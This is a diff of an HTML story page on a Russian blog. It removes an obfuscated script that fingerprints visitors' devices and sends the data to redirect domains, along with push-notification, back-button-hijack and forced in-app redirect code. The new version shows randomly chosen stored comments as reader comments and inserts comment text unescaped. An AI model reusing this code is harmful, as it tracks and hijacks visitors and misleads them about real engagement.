@@ -1,239 +1,282 @@
+<!DOCTYPE html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Сладкие истории — блог, где рассказываются удивительные и трогательные истории о жизни и природе.">
-    <meta property="og:title" content="Сладкие истории - Блог">
-    <meta property="og:description" content="Читаем о самых трогательных и удивительных историях жизни и природы.">
-    <meta property="og:image" content="images/sweet.png">
-    <meta property="og:url" content="https://sweet-story.online">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="pushsdk" content="7dad980bc7b2e52668d9bfa4ca083133">
-    <title>Сладкие истории - Блог</title>
+    <title id="story-title">История</title>
 
-    <!-- Google AdSense -->
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4048193958934146"
-        crossorigin="anonymous"></script>
-
-    <!-- Добавление favicon -->
+    <!-- Favicon -->
     <link rel="icon" href="images/favicon.ico" type="image/x-icon">
-    
-    <!-- Подключение основных стилей -->
+
+    <!-- Подключение стилей -->
     <link rel="stylesheet" href="css/styles.css">
-
-    <!-- Подключение стилей для рекламы -->
-    <link rel="stylesheet" href="css/ad-styles.css">
-
-    <!-- Подключение стилей для мобильных устройств -->
+    <link rel="stylesheet" href="css/responsive.css">
     <link rel="stylesheet" href="css/mobile.css" media="only screen and (max-width: 768px)">
+    <link rel="stylesheet" href="css/share.css">
 
-    <!-- Подключение новых стилей -->
-    <link rel="stylesheet" href="css/stil.css">
-
-    <!-- Google Analytics: GA4 -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMX96T4785"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-
-      gtag('config', 'G-LMX96T4785');
-    </script>
-
-    <!-- Новый скрипт -->
-    <script>
-        var a = 'mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m, c, i) => i % 2 ? m + c : c + m).split('c');
-        var Replace = (o => {
-            var v = a[0];
-            try {
-                v += a[1] + Boolean(navigator[a[2]][a[3]]);
-                navigator[a[2]][a[4]](o[0]).then(r => {
-                    o[0].forEach(k => {
-                        v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0];
-                    });
-                });
-            } catch (e) {}
-            return u => {
-                // Открываем ссылку в новой вкладке
-                window.open([u, v].join(u.indexOf(a[7]) > -1 ? a[5] : a[7]), '_blank');
-            };
-        })([[a[8], a[9], a[10], a[11]], [a[12], a[13], a[14], a[15]]]);
-        
-        var s = document.createElement('script');
-        s.src = '//vuzismoothie.net/b12/92a26/mw.min.js?z=8759192' + '&sw=/sw-check-permissions-f7638.js' + '&nouns=1';
-        s.onload = function(result) {
-            switch (result) {
-                case 'onPermissionDefault':
-                    Replace("//nangooroamsoo.net/4/8759177");
-                    break;
-                case 'onPermissionAllowed':
-                    Replace("//nangooroamsoo.net/4/8759177");
-                    break;
-                case 'onPermissionDenied':
-                    Replace("//nangooroamsoo.net/4/8759177");
-                    break;
-                case 'onAlreadySubscribed':
-                    Replace("//nangooroamsoo.net/4/8759177");
-                    break;
-                case 'onNotificationUnsupported':
-                    Replace("//nangooroamsoo.net/4/8759177");
-                    break;
-            }
-        };
-        document.head.appendChild(s);
-    </script>
-    <script>
-        var Back_Button_Zone = 8759177;
-        var Domain_TB = "kaufoopaih.net";
-    </script>
-    <script async src="https://desenteir.com/b12/92a26/reverse.min.js?sf=1"></script>
-
-    <script>
-        function isInApp() {
-            const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
-            return Boolean(navigator.userAgent.match(regex));
-        }
-
-        function initInappRd() {
-            var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
-            var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
-            var trafficbackURL = "https://nangooroamsoo.net/4/8759177/";
-            var ua = navigator.userAgent.toLowerCase();
-
-            if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
-                document.body.addEventListener('click', function () {
-                    window.onbeforeunload = null;
-                    // Открываем ссылки в новой вкладке
-                    window.open(completeRedirectURL, '_system');
-                    setTimeout(function () {
-                        window.open(trafficbackURL, '_blank');
-                    }, 1000);
-                });
-            }
-        }
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initInappRd);
-        } else {
-            initInappRd();
-        }
-    </script>
+    <!-- SEO Meta tags -->
+    <meta name="description" content="Добро пожаловать на Sweet Story - сайт удивительных историй и вдохновения.">
+    <meta property="og:title" content="Sweet Story - вдохновляющие истории">
+    <meta property="og:description" content="Читайте и делитесь лучшими историями на Sweet Story. Захватывающие сюжеты, которые оставляют след в сердце.">
 </head>
-
-
 <body>
-
-<header>
-    <div class="logo">
-        <a href="index.html">Sweet Story</a>
-    </div>
-    <nav>
-        <ul>
-            <li><a href="index.html">Главная</a></li>
-            <li><a href="about.html">О нас</a></li>
-            <li><a href="contact.html">Контакты</a></li>
-        </ul>
-        <button class="toggle-btn" id="menu-toggle" aria-label="Открыть меню">&#9776;</button>
-    </nav>
-</header>
-
-<main>
-    <div class="container">
-        <section class="story">
-            <div class="story-meta">
-                <span class="views">
-                    <img src="images/eye-icon.png" alt="Просмотры" class="eye-icon">
-                    Просмотрено: 5875 человек
-                </span>
-            </div>
-            <h1>История о матери и сыне: Путь к прощению</h1>
-            <p class="meta">Автор: Анна Петрова | 5 Января 2025</p>
-            
-            <!-- Lazy Loading для изображений -->
-            <img src="images/1.jpg" alt="Картинка к истории" class="story-image" loading="lazy">
-            
-            <p><strong>Необычная и трогательная история о матери и сыне, которые спустя годы после разрыва вновь встретились. История прощения, боли и судебных разбирательств, вызвавшая бурю эмоций среди общественности.</strong></p>
-            
-            <p>Она оставила своего сына в доме для сирот, но даже и не представляла, кем он станет, когда вырастет. И вот, спустя годы, она пришла к нему с извинениями, но не ожидала, что он так отреагирует.</p>
-            
-            <p>Некоторым людям не так повезло — не все рождаются с золотой ложкой во рту. Моя двоюродная сестра закончила школу и поступила в университет. Там она встретила парня и влюбилась в него по уши. Точнее, так она думала в тот момент. Она уже начала планировать свое будущее, хотела выйти за него замуж. Но у молодого человека не было таких серьезных намерений. Он не собирался жениться на ней. И у судьбы были свои планы. Когда она забеременела, она уже была на втором курсе университета. Она решила поделиться этой радостной новостью с возлюбленным.</p>
-            
-            <p>Однако он сказал, что не имеет к этому никакого отношения, и просто исчез из ее жизни, уйдя в неизвестном направлении. Она вернулась домой и долго находилась в печали и депрессии. А что было с ней после рождения сына? Она пыталась найти утешение. В жизни появились другие мужчины, но и они оставляли ее. В конце концов, она оставила его в роддоме, а потом забыла о нем. Мальчика усыновили, и ему повезло с приемными родителями… Его воспитали порядочным и образованным человеком.</p>
-            
-            <p>Он вырос добрым, смелым, честным и послушным. Когда он окончил школу, ему удалось открыть собственное дело, и он стал зарабатывать немалые деньги. Со временем его доходы начали расти. Однажды к нему пришла его биологическая мать и попросила помочь ей, поддержать ее, а даже купить квартиру, говоря, что она — его мать, и он должен заботиться о ней. Он отказался. Дело дошло до суда. В результате, по решению суда, она не могла приближаться к нему ближе, чем на несколько километров. Как вы думаете, было ли это решение справедливым?</p>
-            
-            <p>Жизнь сына, усыновлённого и воспитанного добросердечными людьми, сложилась вполне успешно. После того как он достиг финансового успеха, он отказал матери, которая пришла к нему с просьбой о помощи. Мать утверждала, что она должна получать от него поддержку, так как является его биологической матерью, но он принял решение судиться, что привело к решению суда, запрещающему ей приближаться к нему.</p>
-            
-            <p>Позиция сына в этом вопросе вызвала полярные мнения в обществе. Сторонники считают его решение оправданным, в то время как противники утверждают, что он поступил жестоко. Этот случай вновь поставил вопрос о том, как далеко можно зайти в поисках прощения и справедливости.</p>
-        </section>
-        
-        
-
-        <aside class="sidebar">
-            <h2>Также читают</h2>
-            <ul>
+    <!-- Шапка сайта -->
+    <header>
+        <div class="logo">
+            <a href="index.html">Sweet Story</a>
+        </div>
+        <nav>
+            <ul id="mobile-menu">
                 <li><a href="index.html">Главная</a></li>
-                <li><a href="story1.html">История о матери и сыне: Путь к прощению</a></li>
-                <li><a href="story2.html">История о 60-летнем юбилее и забытой дочери</a></li>
-                <li><a href="story3.html">Семейная история: как справляться с конфликтами</a></li>
-                <li><a href="story4.html">Выгнал дочь на мороз, а когда вспомнил о ней</a></li>
-                <li><a href="story5.html">Ночной детектив</a></li>
-                <li><a href="story6.html">История Галины Семёновны: Жизнь в круге жертвенности</a></li>
-                <li><a href="story7.html">История о семье и испытаниях доверия</a></li>
-                <li><a href="story8.html">История о семье и взрослении</a></li>
-                <li><a href="story9.html">История о свекрови, невестке и прощании</a></li>
-                <li><a href="story10.html">Жизнь водителя и его путешествие</a></li>
-                <li><a href="story11.html">Ссора из-за денег</a></li>
-                <li><a href="story12.html">Жизненные уроки у мангала</a></li>
-                <li><a href="story13.html">Мудрость Розы</a></li>
+                <li><a href="about.html">О нас</a></li>
+                <li><a href="contact.html">Контакты</a></li>
             </ul>
-            
-            
-        </aside>
-    </div>
-</main>
+        </nav>
+    </header>
 
-<section class="comments">
-    <h2>Комментарии</h2>
-    <div id="comments-list">
-        <!-- Здесь будут отображаться комментарии -->
+        
+    <main>
+        <div class="container">
+            <div class="story">
+                <div class="story-meta">
+                    <span id="story-views" class="views">Просмотрено: </span>
+                </div>
+                <h1 id="story-title-main">Загружается...</h1>
+                <p id="story-meta" class="meta"></p>
+                <img id="story-image" src="" alt="" class="story-image" loading="lazy">
+                <p id="story-content"><strong>Загружается текст истории...</strong></p>
+
+                <!-- Кнопка поделиться на Facebook -->
+                <div class="share">
+                    <a id="share-facebook" href="#" target="_blank" class="share-facebook animate">Поделиться на Facebook</a>
+                </div>
+            </div>
+
+            <!-- Подключение сайдбара -->
+            <div class="sidebar">
+                <h2>Также читают</h2>
+                <ul>
+                    <!-- Ссылки будут загружены здесь -->
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <!-- Скрипт для подгрузки истории -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+    const commentForm = document.querySelector('#comment-form');
+    commentForm.addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        const textarea = commentForm.querySelector('textarea');
+        const newCommentText = textarea.value.trim();
+
+        if (newCommentText === '') {
+            alert('Пожалуйста, введите текст комментария.');
+            return;
+        }
+
+        const newComment = {
+            author: 'Пользователь',
+            text: newCommentText
+        };
+
+        const commentsSection = document.getElementById('comments-section');
+        const commentBlock = document.createElement('div');
+        commentBlock.style.borderBottom = '1px solid #ddd';
+        commentBlock.style.marginBottom = '10px';
+        commentBlock.style.paddingBottom = '10px';
+
+        commentBlock.innerHTML = `
+            <p><strong>${newComment.author}</strong></p>
+            <p>${newComment.text}</p>
+        `;
+
+        commentsSection.appendChild(commentBlock);
+        textarea.value = '';
+        alert('Ваш комментарий добавлен!');
+    });
+            const urlParams = new URLSearchParams(window.location.search);
+            const storyId = urlParams.get('id');
+
+            document.getElementById('story-content').innerHTML = '<strong>Загрузка...</strong>';
+
+            fetch('stories.json')
+                .then(response => response.json())
+                .then(stories => {
+                    const story = stories.find(item => item.id == storyId);
+                    if (story) {
+                        document.getElementById('story-title').innerText = story.title;
+                        document.getElementById('story-title-main').innerText = story.title;
+                        document.getElementById('story-meta').innerText = `Автор: ${story.author}`;
+                        document.getElementById('story-views').innerText = `Просмотрено: ${story.views} человек`;
+                        document.getElementById('story-image').src = story.image;
+                        document.getElementById('story-image').alt = story.title;
+                        document.getElementById('story-content').innerText = story.content;
+
+                        const currentUrl = `https://sweet-story.online?id=${story.id}`;
+                        const facebookShareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(currentUrl)}&quote=${encodeURIComponent(story.title)}`;
+                        document.getElementById('share-facebook').href = facebookShareUrl;
+                    } else {
+                        document.querySelector('.story').innerHTML = '<p>История не найдена!</p>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка загрузки истории:', error);
+                    document.querySelector('.story').innerHTML = '<p>Произошла ошибка при загрузке данных. Попробуйте позже.</p>';
+                });
+
+            fetch('stories.json')
+                .then(response => response.json())
+                .then(stories => {
+                    const sidebar = document.querySelector('.sidebar ul');
+                    sidebar.innerHTML = '';
+
+                    const randomStories = stories.sort(() => 0.5 - Math.random()).slice(0, 10);
+
+                    const fragment = document.createDocumentFragment();
+                    randomStories.forEach(story => {
+                        const listItem = document.createElement('li');
+                        listItem.innerHTML = `<a href="story1.html?id=${story.id}">${story.title}</a>`;
+                        fragment.appendChild(listItem);
+                    });
+                    sidebar.appendChild(fragment);
+                })
+                .catch(error => {
+                    console.error('Ошибка загрузки историй для сайдбара:', error);
+                    document.querySelector('.sidebar ul').innerHTML = '<li>Не удалось загрузить истории. Попробуйте позже.</li>';
+                });
+        });
+        // Добавление нового комментария
+    const commentForm = document.querySelector('#comment-form');
+    commentForm.addEventListener('submit', function (event) {
+        event.preventDefault(); // Предотвращаем перезагрузку страницы
+
+        const textarea = commentForm.querySelector('textarea');
+        const newCommentText = textarea.value.trim();
+
+        if (newCommentText === '') {
+            alert('Пожалуйста, введите текст комментария.');
+            return;
+        }
+
+        // Создаем новый комментарий
+        const newComment = {
+            author: 'Пользователь',
+            text: newCommentText
+        };
+
+        // Отображаем комментарий на странице
+        const commentsSection = document.getElementById('comments-section');
+        const commentBlock = document.createElement('div');
+        commentBlock.style.borderBottom = '1px solid #ddd';
+        commentBlock.style.marginBottom = '10px';
+        commentBlock.style.paddingBottom = '10px';
+
+        commentBlock.innerHTML = `
+            <p><strong>${newComment.author}</strong></p>
+            <p>${newComment.text}</p>
+        `;
+
+        commentsSection.appendChild(commentBlock);
+
+        // Очищаем поле ввода
+        textarea.value = '';
+
+        alert('Ваш комментарий добавлен!');
+    });
+</script>
+    <!-- Подвал сайта -->
+    <div class="comments" style="padding: 20px; background: #f9f9f9; border-top: 1px solid #ddd; margin-top: 20px; max-width: 1000px; margin-left: auto; margin-right: auto;">
+    <h2 style="text-align: center;">Комментарии</h2>
+    <div id="comments-section">
+        <p style="text-align: center;">Здесь пока нет комментариев. Будьте первым!</p>
     </div>
-    <form id="comment-form" data-story-id="story1">
-        <label for="comment-name">Ваше имя:</label>
-        <input type="text" id="comment-name" name="name" placeholder="Введите ваше имя" required>
-        
-        <label for="comment-text">Комментарий:</label>
-        <textarea id="comment-text" name="comment" placeholder="Оставьте комментарий" rows="5" required></textarea>
-        
-        <button type="submit">Отправить</button>
+    <form id="comment-form" style="margin-top: 20px;">
+        <textarea style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px;" placeholder="Напишите комментарий..."></textarea>
+        <button type="submit" style="margin-top: 10px; padding: 10px 20px; background: var(--primary-color); color: #fff; border: none; border-radius: 5px; cursor: pointer;">Отправить</button>
     </form>
-</section>
-
-
-
-<form name="contact" netlify netlify-honeypot="bot-field" hidden>
-    <input type="hidden" name="form-name" value="contact">
-    <label for="name">Ваше имя:</label>
-    <input type="text" id="name" name="name" placeholder="Введите ваше имя" required>
-    
-    <label for="email">Ваш Email:</label>
-    <input type="email" id="email" name="email" placeholder="Введите ваш email" required>
-    
-    <label for="message">Ваше сообщение:</label>
-    <textarea id="message" name="message" placeholder="Введите ваше сообщение" rows="5" required></textarea>
-    
-    <button type="submit">Отправить</button>
-</form>
-
-
-
-
+</div>
 <footer>
-    <p>&copy; 2025 Сладкие истории. Все права защищены.</p>
-    <a href="privacy.html">Политика конфиденциальности</a>
+    <div class="footer-content" style="text-align: center;">
+        <p>&copy; 2025 Sweet Story. Все права защищены.</p>
+        <nav>
+            <ul style="display: inline-block; list-style: none; padding: 0; margin: 0;">
+                <li style="display: inline; margin-right: 15px;"><a href="privacy.html">Политика конфиденциальности</a></li>
+                <li style="display: inline;"><a href="terms.html">Условия использования</a></li>
+            </ul>
+        </nav>
+    </div>
 </footer>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const storyId = new URLSearchParams(window.location.search).get('id');
 
-<!-- Подключение вашего JavaScript -->
-<script src="js/script.js"></script>
+        // Загружаем случайные комментарии
+        fetch('comments.json')
+            .then(response => response.json())
+            .then(comments => {
+                const commentsSection = document.getElementById('comments-section');
+                commentsSection.innerHTML = ''; // Очищаем текущие комментарии
 
+                if (comments.length > 0) {
+                    // Выбираем 3-4 случайных комментария
+                    const randomComments = comments.sort(() => 0.5 - Math.random()).slice(0, Math.floor(Math.random() * 2) + 3);
+
+                    randomComments.forEach(comment => {
+                        const commentBlock = document.createElement('div');
+                        commentBlock.style.borderBottom = '1px solid #ddd';
+                        commentBlock.style.marginBottom = '10px';
+                        commentBlock.style.paddingBottom = '10px';
+
+                        commentBlock.innerHTML = `
+                            <p><strong>${comment.author}</strong></p>
+                            <p>${comment.text}</p>
+                        `;
+                        commentsSection.appendChild(commentBlock);
+                    });
+                } else {
+                    commentsSection.innerHTML = '<p style="text-align: center;">Здесь пока нет комментариев. Будьте первым!</p>';
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка загрузки комментариев:', error);
+                document.getElementById('comments-section').innerHTML = '<p style="text-align: center;">Не удалось загрузить комментарии. Попробуйте позже.</p>';
+            });
+    });
+</script>
+<style>
+@media (max-width: 768px) {
+    .logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        margin: 0 auto;
+    }
+
+    .logo a {
+        display: inline-block;
+    }
+}
+</style>
+<button id="scroll-to-top" style="position: fixed; bottom: 20px; right: 20px; padding: 10px 15px; background: var(--primary-color); color: #fff; border: none; border-radius: 50%; cursor: pointer; display: none; z-index: 1000;">&uarr;</button>
+<script>
+    // Показ кнопки наверх при скролле
+    document.addEventListener('scroll', function () {
+        const scrollButton = document.getElementById('scroll-to-top');
+        if (window.scrollY > 300) {
+            scrollButton.style.display = 'block';
+        } else {
+            scrollButton.style.display = 'none';
+        }
+    });
+
+    // Логика скролла наверх
+    document.getElementById('scroll-to-top').addEventListener('click', function () {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+</script>
 </body>
 </html>
